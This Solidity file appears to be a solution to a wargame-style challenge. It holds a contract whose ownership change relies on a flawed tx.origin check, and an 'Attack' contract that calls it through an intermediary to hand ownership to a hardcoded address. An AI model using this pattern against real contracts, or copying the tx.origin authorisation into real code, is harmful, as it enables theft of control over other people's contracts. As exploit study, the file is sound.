//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attack{
    address _addr = 0xB8fc18Bb59c487C355b2c1B1Af5186E7Fb215872;
    address new_owner = 0x02d09E69e528d7DA14F32Cd21b55aFFa1FF7F873;

    function kek() external{
      ITelephone(_addr).changeOwner(new_owner);
    }
}